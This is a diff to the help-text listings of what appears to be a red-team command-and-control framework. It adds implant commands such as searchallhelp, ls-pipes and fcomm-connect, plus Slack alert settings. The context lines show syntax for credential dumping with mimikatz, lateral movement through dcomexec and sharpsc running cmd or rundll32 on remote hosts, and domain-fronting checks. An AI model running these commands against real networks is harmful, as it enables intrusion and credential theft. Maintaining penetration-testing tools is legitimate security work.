@@ -45,6 +45,7 @@ hide-implant
 unhide-implant
 help
 searchhelp persistence
+searchallhelp mimikatz
 searchhistory invoke-mimikatz
 back
 label-implant <newlabel>
@@ -86,6 +87,7 @@ resolvednsname google.com
 loadmodule Seatbelt.exe
 loadmoduleforce
 listmodules
+ls-pipes
 modulesloaded
 run-exe Core.Program Core
 run-dll Seatbelt.Program Seatbelt UserChecks
@@ -107,6 +109,7 @@ loadpowerstatus
 getpowerstatus
 stoppowerstatus
 searchhelp listmodules
+searchallhelp mimikatz
 searchhistory invoke-mimikatz
 label-implant <newlabel>
 remove-label
@@ -220,6 +223,8 @@ dcomexec -t 10.0.0.1 -m shellwindows -c c:\\windows\\system32\\cmd.exe -a "/c no
 sharpsc SERVER01 service "cmd /c rundll32.exe test.dll,Ep" domain username password
 pbind-connect hostname
 pbind-connect hostname <pipename> <secret>
+fcomm-connect
+fcomm-connect filepath
 
 * Lateral Movement with Pre-Built Payload:
 ===========================================
@@ -259,6 +264,7 @@ posh_help = """
 ps
 invoke-urlcheck -urls https://api.hsbc.com,https://d36xb1r83janbu.cloudfront.net -domainfront d2argm04ypulrn.cloudfront.net,d36xb1r83janbu.cloudfront.net -uri /en-gb/surface/accessories/
 searchhelp mimikatz
+searchallhelp mimikatz
 searchhistory invoke-mimikatz
 label-implant <newlabel>
 remove-label
@@ -505,6 +511,7 @@ $socket = new-object System.Net.Sockets.TcpListener('0.0.0.0', 1080);$socket.sta
 * Implant Handler:
 ====================
 searchhelp payload
+searchallhelp mimikatz
 searchhistory pushover
 back
 quit
@@ -551,6 +558,9 @@ generate-reports
 generate-csvs
 set-pushover-applicationtoken df2
 set-pushover-userkeys 44789
+set-slack-userid UHEJYT2AA
+set-slack-channel #bots
+set-slack-bottoken xobo-
 set-defaultbeacon 60
 get-killdate
 set-killdate 22/10/2019
@@ -570,7 +580,7 @@ kill
 """
 
 special_characters = "!@#$%^&*()+=."
-
+allhelp = sharp_help.split('\n')+py_help.split('\n')+posh_help.split('\n')+server_help.split('\n')
 
 def build_help(help_string):
     commands = []
